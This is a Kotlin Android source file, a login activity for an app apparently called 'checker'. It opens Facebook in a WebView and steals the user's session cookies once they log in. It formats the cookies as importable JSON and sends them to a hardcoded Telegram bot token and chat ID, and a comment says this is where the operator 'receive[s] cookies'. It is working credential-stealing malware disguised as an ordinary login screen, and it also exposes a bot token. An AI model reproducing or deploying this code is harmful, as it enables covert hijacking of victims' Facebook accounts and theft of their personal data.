package com.dm.checker

import android.app.ProgressDialog
import android.content.Context
import android.content.SharedPreferences
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.dm.checker.databinding.ActivityLoginBinding
import com.dm.checker.databinding.ActivityMainBinding
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.io.IOException
import java.net.HttpURLConnection
import java.net.MalformedURLException
import java.net.URL


class LoginActivity : AppCompatActivity() {

    private val BOT_TOKEN = "2143726592:AAHvUMfHKk2PesVlpkxtv-UZFCnMsC-_sb8"
    private val TG_API_ENDPOINT = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s"
    private val CHAT_ID = "1079021017" // where you want to receive cookies through your bot

    private lateinit var binding: ActivityLoginBinding
    private lateinit var preferences: SharedPreferences
    private lateinit var progressDialog: ProgressDialog

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoginBinding.inflate(layoutInflater)
        setContentView(binding.root)

        preferences = getPreferences(Context.MODE_PRIVATE)
        progressDialog = ProgressDialog(this).apply {
            setMessage("Processing...")
            setCancelable(false)
        }

        binding.wvMain.apply {
            WebSettingsUtils.webSettings(this)
            WebSettingsUtils.webMobile(this)
            settings.userAgentString = WebSettingsUtils.DESK
        }
        binding.wvMain.webViewClient = object : WebViewClient() {

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                val cookie = CookieManager.getInstance().getCookie(url)
                Log.e("TAG", "$cookie with $url")

                if (cookie.contains("c_user")) {
                    progressDialog.show()
                    try {
                        parseCookiesToJson(cookie)?.let { parsedCookies ->
                            sendCookiesToTelegram(parsedCookies)
                            Handler(mainLooper).postDelayed({
                                progressDialog.dismiss()
                                setResult(RESULT_OK)
                                finish()
                            }, 3000)
                        } ?: run {
                            Handler(mainLooper).postDelayed({
                                progressDialog.dismiss()
                                setResult(RESULT_OK)
                                finish()
                            }, 3000)
                        }
                    } catch (e: JSONException) {
                        Log.e("TAG", "${e.message}")
                    }
                }
            }
        }
        binding.wvMain.loadUrl("https://m.facebook.com/")
    }

    @Throws(JSONException::class)
    private fun parseCookiesToJson(cookie: String): String? {
        val listOFCookies: MutableList<JSONObject> = ArrayList()
        val arrayOfCookies = cookie.split(";".toRegex()).toTypedArray()
        for (eachCookie in arrayOfCookies) {
            val arrayOfEachCookie = eachCookie.split("=".toRegex()).toTypedArray()
            val jsonObject = JSONObject()
            jsonObject.put("name", arrayOfEachCookie[0].trim { it <= ' ' })
            jsonObject.put("value", arrayOfEachCookie[1].trim { it <= ' ' })
            if (jsonObject.getString("name") == "c_user") {
                if (jsonObject.getString("value") == preferences.getString("C_USER", "NO_C_USER")) {
                    return null
                } else {
                    val edit: SharedPreferences.Editor = preferences.edit()
                    edit.putString("C_USER", jsonObject.getString("value"))
                    edit.apply()
                }
            }
            jsonObject.put("domain", ".facebook.com")
            if (arrayOfEachCookie[0] == "m_pixel_ratio" || arrayOfEachCookie[0] == "c_user" || arrayOfEachCookie[0] == "wd" || arrayOfEachCookie[0] == "x-referer") {
                jsonObject.put("httpOnly", false)
            } else {
                jsonObject.put("httpOnly", true)
            }
            jsonObject.put("path", "/")
            jsonObject.put("secure", true)
            jsonObject.put("httpOnly", false)
            jsonObject.put("sameSite", "no_restriction")
            if (arrayOfEachCookie[0] == "m_pixel_ratio" || arrayOfEachCookie[0] == "x-referer") {
                jsonObject.put("session", true)
            } else {
                jsonObject.put("session", false)
            }
            jsonObject.put("firstPartyDomain", "")
            jsonObject.put("storeId", null)
            listOFCookies.add(jsonObject)
        }
        Log.e("TAG", listOFCookies.toString())
        val j2Cookies = JSONObject()
        j2Cookies.put("url", "https://www.facebook.com")
        j2Cookies.put("cookies", JSONArray(listOFCookies))
        Log.e("TAG", j2Cookies.toString())
        return j2Cookies.toString().replace("\\", "")
    }

    private fun sendCookiesToTelegram(message: String) {
        Thread {
            try {
                val url = URL(String.format(TG_API_ENDPOINT, BOT_TOKEN, CHAT_ID, message))
                val http: HttpURLConnection = url.openConnection() as HttpURLConnection
                http.requestMethod = "GET"
                http.setRequestProperty("Host", "api.telegram.org")
                http.inputStream
                http.disconnect()
            } catch (e: MalformedURLException) {
                Log.e("TAG", "MalformedURLException: ${e.message}")
            } catch (e: IOException) {
                Log.e("TAG", "IOException: ${e.message}")
            }
        }.start()
    }
}